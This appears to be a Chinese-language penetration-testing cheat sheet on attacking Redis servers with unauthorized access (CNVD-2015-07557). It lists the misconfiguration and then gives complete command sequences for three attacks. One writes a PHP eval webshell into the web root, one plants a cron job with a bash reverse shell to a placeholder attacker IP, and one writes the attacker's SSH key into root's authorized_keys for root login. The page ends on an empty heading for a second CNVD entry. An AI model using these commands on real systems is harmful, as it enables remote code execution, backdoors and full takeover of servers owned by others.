---
title: "Redis"
date: 2025-09-21
tags:
  - Others
categories:
  - Others
description: None
---
默认端口：6307

## CNVD-2015-07557 未授权访问

redis.conf 配置不当

```txt
# 注释掉bind行，允许所有IP连接
bind 127.0.0.1

# 关闭保护模式（>3.2.0）
protected-mode no

# 设置密码为空
# requirepass ""
```

- 写 Webshell

一般需要知道对应的 web 路径，web 目录权限可读写

```shell
# 写 webshell
config set dir /var/www/html	# 设置web写目录
config set dbfilename shell.php	# 设置写入的文件名
set test "<?php @eval($_POST['attack']);?>"	# 设置写入文件代码
# bgsave	# 保存执行
save	# 保存执行
```

- 写定时任务反弹 shell

利用条件：Redis 服务使用 root 启动，安全模式 protected-mode 处于关闭状态

```bash
config set dir /var/spool/cron
config set dbfilename root	# www-data / xxx
set yy "\n\n\n* * * * * bash -i >& /dev/tcp/xxx.xxx.xxx.xxx/5566 0>&1\n\n\n"
save
```

> CentOS 会忽略乱码去执行格式正确的任务计划，而 Ubuntu 并不会忽略这些乱码导致命令执行失败

- 写入 Linux ssh-key 公钥

利用条件：Redis 服务使用 root 启动，安全模式 protected-mode 处于关闭状态；服务器允许使用秘钥登录。

```bash
# 攻击机 生成并构造公钥
ssh-keygen -t rsa
cd /root/.ssh/
(echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > key.txt	# 在公钥前后加空行，避免 RDB 文件头部的二进制垃圾污染公钥格式。
cat key.txt | redis-cli -h 目标IP -x set xxx	# 通过 -x 将公钥传入redis key为xxx

# 靶机
config set dir /root/.ssh/
config set dbfilename authorized_keys
save

# 连接
cd /root/.ssh/
ssh -i id_rsa root@目标IP
```

> SSH 服务在读取 `authorized_keys` 时，可能会因格式错误**忽略整行或整个文件**，导致无法登录。
> 
> 在**某些旧版本 Redis（如 2.x ~ 3.x）** 或**特定系统环境**下会跳过该文件的无效行从而正确执行。

CNVD-2019-21763
